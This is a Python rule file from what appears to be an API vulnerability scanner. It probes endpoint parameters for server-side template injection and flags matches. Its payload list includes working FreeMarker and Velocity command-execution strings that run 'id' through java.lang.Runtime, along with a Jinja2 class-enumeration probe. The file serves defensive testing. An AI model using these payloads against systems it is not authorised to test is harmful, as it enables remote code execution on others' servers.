from typing import List
import re
from apscan.core.context import APIEndpoint, Vulnerability, Severity, ScanContext, HttpMethod, ScanRequest
from apscan.core.rule import ScannerRule

class SSTIRule(ScannerRule):
    id = "INJ-004"
    name = "Server-Side Template Injection (SSTI)"
    
    PAYLOADS = [
        # Python (Jinja2, Mako)
        "{{7*7}}",
        "{{config}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        
        # Java (Freemarker, Velocity)
        "${7*7}",
        "#{7*7}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "#set($e=\"e\") $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
        
        # PHP (Smarty, Twig)
        "{{7*7}}",
        "{php}echo 7*7;{/php}",
        
        # Generic
        "<%= 7*7 %>",
    ]

    SIGNATURES = [
        r"49",
        r"&lt;Config", # Flask config dump
        r"&lt;module 'os'",
        r"Cycle", # Jinja2 cycle
        r"freemarker\.template",
        r"java\.lang\.Runtime",
        r"uid=[0-9]+\(", # RCE success
    ]
    # Note: "49" is very generic, need to be careful. Ideally we check if 7*7 became 49.
    # A robust check would be injecting a random calc like {{1337*1337}} and checking for 1787569.
    # For now, simplistic approach.

    async def run(self, endpoint: APIEndpoint, context: ScanContext) -> List[Vulnerability]:
        findings = []
        if endpoint.parameters:
            for param in endpoint.parameters:
                p_loc = param.get('in', 'query')
                if p_loc in ['query', 'body', 'formData']:
                    findings.extend(await self._test_param(endpoint, context, param['name'], p_loc, endpoint.parameters))
        return findings

    async def _test_param(self, endpoint, context, param_name, param_loc, all_params):
        findings = []
        base_url = context.target_url.rstrip('/') + endpoint.path
        
        base_body = {}
        if all_params:
            for p in all_params:
                 if p.get('in') == param_loc:
                     schema = p.get('schema', {})
                     base_body[p['name']] = schema.get('default', 'test')

        for payload in self.PAYLOADS:
            params = {}
            json_body = None
            data = None
            
            if param_loc == 'query':
                params = {param_name: payload}
            elif param_loc == 'body':
                import copy
                json_body = copy.deepcopy(base_body)
                json_body[param_name] = payload
            elif param_loc == 'formData':
                import copy
                data = copy.deepcopy(base_body)
                data[param_name] = payload
            
            headers = {}
            headers.update(context.auth_headers)
            
            req = ScanRequest(
                method=endpoint.method,
                url=base_url,
                params=params, 
                json_body=json_body,
                data=data,
                headers=headers
            )
            
            resp = await context.http_client.send(req)
            
            # Special check for calculation
            if "7*7" in payload:
                if "49" in resp.body and "7*7" not in resp.body: # Evaluation happened
                     findings.append(self._create_finding(endpoint, payload, "Evaluated '7*7' to '49'", resp.body))
                     return findings
            
            for signature in self.SIGNATURES:
                if signature == r"49": continue # Handled above
                if re.search(signature, resp.body):
                    findings.append(self._create_finding(endpoint, payload, signature, resp.body))
                    return findings
        return findings

    def _create_finding(self, endpoint, payload, match, body):
        return Vulnerability(
            rule_id=self.id,
            name=self.name,
            severity=Severity.HIGH,
            description=f"Template Injection detected. Server evaluated '{payload}'.",
            impact="Remote Code Execution (RCE) via template engine sandbox escape.",
            endpoint=endpoint.path,
            recommendation="Use logic-less templates or disable template evaluation of user input.",
            method=endpoint.method,
            evidence=f"Payload: {payload}\nMatched: {match}\nResponse Snippet: {body[:200]}"
        )
